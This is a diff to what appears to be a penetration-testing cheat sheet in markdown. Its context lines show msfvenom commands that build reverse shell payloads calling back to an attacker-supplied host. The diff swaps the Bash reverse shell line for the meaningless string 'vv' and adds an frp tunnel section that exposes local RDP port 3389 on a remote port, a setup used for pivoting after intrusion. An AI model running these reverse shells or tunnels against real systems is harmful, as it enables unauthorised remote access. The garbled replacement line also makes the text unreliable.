@@ -59,7 +59,7 @@ msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=12306 -f raw >
 ### Bash
 
 ```bash
-msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=12306 -f raw > shell.sh
+vv
 ```
 
 ### Perl
@@ -127,6 +127,12 @@ type = tcp
 remote_port = 54321 
 plugin = socks5
 use_encryption = true
+
+[i]
+type = tcp
+local_ip = 127.0.0.1       
+local_port = 3389
+remote_port = 12346
 ```
 
 #### frps
